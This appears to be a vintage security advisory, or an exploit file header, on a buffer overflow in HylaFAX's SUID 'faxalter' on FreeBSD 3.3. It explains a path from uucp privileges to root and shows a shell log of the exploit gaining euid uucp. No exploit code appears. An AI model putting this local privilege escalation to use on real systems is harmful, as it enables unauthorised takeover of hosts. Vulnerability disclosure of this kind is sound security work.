Some versions of Hylafax ship with a vulnerable sub program 'faxalter'. This program is installed SUID UUCP and has a buffer overflow which if exploited will allow a malicious user to gain UUCP privileges. ， Because the important programs are executed as root , such as Minicom ( a popular modem terminal program ) or cu ( 1 ) and are in the UUCP group and therefore writable by the same group they could be trojaned by the attacker. A successful scenario in this event would lead to a root compromise. ， / * EXPLOIT ， bash-2.03 $ uname -a ; ls -la `which faxalter` ; id ， FreeBSD 3.3-RELEASE FreeBSD 3.3-RELEASE # 0 : Thu Sep 16 23 : 40 : 35 GMT ， 1999 ， jkh @ highwing.cdrom.com : /usr/src/sys/compile/GENERIC i386 ， -r-sr-xr-x 1 uucp bin 72332 Sep 11 03 : 32 /usr/local/bin/faxalter ， uid=1000 ( xnec ) gid=1000 ( xnec ) groups=1000 ( xnec )  , 0 ( wheel )  ， bash-2.03 $ /home/xnec/faxalterx ，  $ id ， uid=1000 ( xnec ) euid=66 ( uucp ) gid=1000 ( xnec ) groups=1000 ( xnec )  , 0 ( wheel )  ，  * / ， / *  ，  * Faxalter exploit for FreeBSD 3.3/hylafax-4.0.2 yields euid=66 ( uucp )  ，  * Brock Tellier btellier @ usa.net ，  * /",
